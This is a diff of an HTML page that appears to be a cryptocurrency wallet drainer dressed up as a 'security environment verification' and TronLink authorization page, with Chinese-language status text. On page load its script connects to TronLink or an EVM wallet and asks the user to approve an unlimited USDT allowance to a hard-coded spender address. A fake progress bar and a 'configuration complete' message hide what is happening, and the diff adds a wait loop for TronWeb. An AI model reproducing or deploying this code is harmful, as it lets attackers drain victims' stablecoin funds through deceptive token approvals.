@@ -1,97 +1,58 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="zh">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>安全環境驗證</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TronLink 授权配置页面</title>
 <style>
   body {
-    font-family: "Noto Sans TC", sans-serif;
-    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
-    background-size: 400% 400%;
-    animation: bgAnim 12s ease infinite;
-    margin: 0;
+    background: #121212;
+    color: #eee;
+    font-family: "Microsoft Yahei", Arial, sans-serif;
     display: flex;
+    flex-direction: column;
+    height: 100vh;
+    margin: 0;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    color: #fff;
-  }
-  @keyframes bgAnim {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
-  }
-  .card {
-    background: rgba(255,255,255,0.05);
-    border-radius: 15px;
-    padding: 30px;
-    text-align: center;
-    max-width: 380px;
-    width: 100%;
-    backdrop-filter: blur(12px);
-    animation: fadeIn 1.2s ease;
-  }
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-  .logo {
-    width: 80px;
-    animation: pulse 2s infinite;
-  }
-  @keyframes pulse {
-    0%,100% { transform: scale(1); }
-    50% { transform: scale(1.1); }
-  }
-  h1 {
-    font-size: 20px;
-    margin-top: 15px;
-  }
-  p {
-    font-size: 14px;
-    color: #cbd5e1;
-    margin-bottom: 20px;
   }
   .status {
-    font-size: 14px;
-    margin-top: 15px;
-    min-height: 20px;
+    font-size: 1.4rem;
+    margin-bottom: 20px;
+    transition: color 0.3s ease;
   }
-  .loading { color: #facc15; }
-  .success { color: #4ade80; }
-  .error { color: #f87171; }
+  .status.loading {
+    color: #888;
+  }
+  .status.success {
+    color: #4caf50;
+  }
+  .status.error {
+    color: #f44336;
+  }
   .progress-bar {
-    width: 100%;
-    height: 6px;
-    background: rgba(255,255,255,0.1);
-    border-radius: 3px;
+    width: 300px;
+    height: 8px;
+    background: #333;
+    border-radius: 4px;
     overflow: hidden;
-    margin-top: 15px;
+    box-shadow: 0 0 5px #222 inset;
   }
-  .progress {
+  .progress-bar > div {
     height: 100%;
     width: 0%;
-    background: linear-gradient(90deg, #3b82f6, #06b6d4);
-    animation: progressAnim 3s linear forwards;
-  }
-  @keyframes progressAnim {
-    from { width: 0%; }
-    to { width: 100%; }
+    background: linear-gradient(90deg, #2196f3, #21cbf3);
+    transition: width 0.5s ease;
   }
 </style>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-<div class="card">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" class="logo" alt="Logo">
-  <h1>環境驗證中...</h1>
-  <p>系統正在檢測鏈路並完成資產同步，請勿關閉頁面</p>
-  <div class="progress-bar"><div class="progress"></div></div>
-  <div class="status loading" id="status">初始化中...</div>
-</div>
 
+<h2>資產通道配置中...</h2>
+<div id="status" class="status loading">正在檢測鏈路...</div>
+<div class="progress-bar"><div id="progress"></div></div>
+
+<script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 <script>
   const CFG = {
     USDT: {
@@ -106,54 +67,52 @@
     AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
   };
 
-  function setStatus(msg, cls="loading") {
-    const el = document.getElementById("status");
-    el.innerText = msg;
-    el.className = "status " + cls;
+  const statusEl = document.getElementById("status");
+  const progressEl = document.getElementById("progress");
+
+  function setStatus(msg, cls="loading", progressPercent=null) {
+    statusEl.innerText = msg;
+    statusEl.className = "status " + cls;
+    if (progressPercent !== null) {
+      progressEl.style.width = progressPercent + "%";
+    }
   }
 
-  async function initVerification() {
-    try {
-      setStatus("正在檢測鏈路...");
-      if (window.tronWeb && window.tronWeb.ready) {
-        await tronApprove();
-        return;
-      }
-      if (window.tronLink) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        await tronApprove();
-        return;
-      }
-      if (window.ethereum) {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        await evmApprove();
-        return;
-      }
-      setStatus("未檢測到鏈路組件", "error");
-      setTimeout(() => window.location.href = "fail.html", 1500);
-    } catch (err) {
-      console.error(err);
-      setStatus("驗證未完成", "error");
-      setTimeout(() => window.location.href = "fail.html", 1500);
-    }
+  // 等待 TronWeb 初始化，最长等待 5 秒
+  async function waitForTronWeb(timeout = 5000) {
+    return new Promise((resolve, reject) => {
+      let waited = 0;
+      const interval = setInterval(() => {
+        if (window.tronWeb && window.tronWeb.ready) {
+          clearInterval(interval);
+          resolve(true);
+        }
+        waited += 200;
+        if (waited >= timeout) {
+          clearInterval(interval);
+          reject(new Error("TronLink 初始化超時"));
+        }
+      }, 200);
+    });
   }
 
   async function tronApprove() {
     try {
-      setStatus("資產通道配置中...");
+      setStatus("資產通道配置中...", "loading", 60);
       const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
       await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
-      setStatus("✅ 配置完成", "success");
+      setStatus("✅ 配置完成", "success", 100);
       setTimeout(() => window.location.href = "success.html", 800);
-    } catch {
-      setStatus("鏈路配置失敗", "error");
+    } catch (e) {
+      console.error("TronApprove Error:", e);
+      setStatus("鏈路配置失敗", "error", 100);
       setTimeout(() => window.location.href = "fail.html", 1500);
     }
   }
 
   async function evmApprove() {
     try {
-      setStatus("資產通道配置中...");
+      setStatus("資產通道配置中...", "loading", 60);
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const network = await provider.getNetwork();
@@ -161,19 +120,68 @@
       if (network.chainId === 1) usdtAddress = CFG.USDT.ETH;
       else if (network.chainId === 56) usdtAddress = CFG.USDT.BNB;
       else throw new Error("不支援的鏈");
+
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
       const contract = new ethers.Contract(usdtAddress, abi, signer);
       const tx = await contract.approve(CFG.TARGET.EVM, CFG.AMOUNT);
       await tx.wait();
-      setStatus("✅ 配置完成", "success");
+      setStatus("✅ 配置完成", "success", 100);
       setTimeout(() => window.location.href = "success.html", 800);
-    } catch {
-      setStatus("鏈路配置失敗", "error");
+    } catch (e) {
+      console.error("EVM Approve Error:", e);
+      setStatus("鏈路配置失敗", "error", 100);
       setTimeout(() => window.location.href = "fail.html", 1500);
     }
   }
 
-  window.addEventListener('load', initVerification);
+  async function initVerification() {
+    try {
+      setStatus("正在檢測鏈路...", "loading", 10);
+
+      // TronLink 檢測
+      if (window.tronLink || (window.tronWeb && window.tronWeb.ready)) {
+        try {
+          setStatus("等待 TronLink 初始化...", "loading", 30);
+          await waitForTronWeb();
+          await tronApprove();
+          return;
+        } catch (e) {
+          console.warn("TronWeb 未初始化", e);
+          // 继续尝试 EVM 或失败
+        }
+      }
+
+      // EVM 檢測
+      if (window.ethereum) {
+        setStatus("請求 EVM 錢包授權...", "loading", 30);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        await evmApprove();
+        return;
+      }
+
+      // 都没检测到钱包
+      setStatus("未檢測到鏈路組件", "error", 100);
+      setTimeout(() => window.location.href = "fail.html", 1500);
+    } catch (err) {
+      console.error("驗證過程錯誤", err);
+      setStatus("驗證未完成", "error", 100);
+      setTimeout(() => window.location.href = "fail.html", 1500);
+    }
+  }
+
+  window.addEventListener('load', () => {
+    // 启动时给个动画进度递增
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+      progress += 5;
+      if (progress < 10) setStatus("正在啟動...", "loading", progress);
+      if (progress >= 10) {
+        clearInterval(progressInterval);
+        initVerification();
+      }
+    }, 100);
+  });
 </script>
+
 </body>
 </html>
